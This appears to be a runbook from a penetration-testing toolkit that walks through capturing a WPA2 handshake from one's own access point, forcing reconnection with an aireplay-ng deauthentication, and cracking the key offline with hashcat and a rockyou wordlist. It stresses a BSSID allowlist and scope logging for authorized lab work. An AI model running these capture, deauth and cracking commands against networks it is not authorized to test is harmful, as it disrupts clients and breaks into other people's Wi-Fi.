# Runbook 03 — Wi-Fi: handshake capture → cracking

**Goal:** capture a WPA2 handshake from an access point **you own**, convert it, and crack
it offline. Your own APs and clients only — Wi-Fi authorization is by BSSID/ESSID in
`scope.yaml`, and `ra-wifi` fails closed on anything not listed.

## 0. Hardware & passthrough (one-time)
Wi-Fi attacks need a **monitor-mode-capable USB adapter** (e.g. Alfa AWUS036ACH / any
`mt7612u`/`rtl8812au`) passed into the container. Uncomment the Wi-Fi block in
`docker/docker-compose.yml`:

```yaml
    network_mode: host
    cap_add: [NET_ADMIN, NET_RAW]
    devices: ["/dev/bus/usb:/dev/bus/usb"]
```
Then verify the adapter is visible inside the toolkit:
```bash
make shell
iw dev           # your wlanN should be listed
```

## 1. Authorize your AP and enter monitor mode
```bash
# scope.yaml -> wifi.bssids / wifi.essids must list YOUR ap
airmon-ng check kill          # stop NetworkManager/wpa_supplicant interference
airmon-ng start wlan0         # -> creates wlan0mon (monitor mode)
```

## 2. Find your AP and capture the handshake
```bash
airodump-ng wlan0mon          # note YOUR ap's BSSID + channel, then Ctrl-C
# ra-wifi enforces the wifi allowlist, filters to your BSSID, and drops the capture
# into the engagement loot/ folder:
ra new wifi-lab && export REDALERT_ENGAGEMENT=<slug>
ra-wifi capture --bssid AA:BB:CC:DD:EE:FF --channel 6 --iface wlan0mon
```
To force a (re)handshake from **your own** client, a targeted deauth in a second shell:
```bash
aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF wlan0mon
```
`(MITRE ATT&CK: T1040 — Network Sniffing)`

## 3. Convert and crack
```bash
ra-wifi convert <capture>.pcapng          # -> <capture>.hc22000  (hashcat mode 22000)
ra-hashcat -m 22000 <capture>.hc22000 /usr/share/wordlists/rockyou.txt
# rules help against human passwords:
ra-hashcat -m 22000 <capture>.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
GPU makes this dramatically faster: `GPU=1 make shell` (needs nvidia-container-toolkit).

## 4. Restore networking
```bash
airmon-ng stop wlan0mon
systemctl restart NetworkManager     # on the host, if you killed it
```

## Deliverable
Handshake capture, hc22000, and any recovered PSK in `engagements/<slug>/` — with the
command log proving scope discipline (you only touched your listed BSSID).
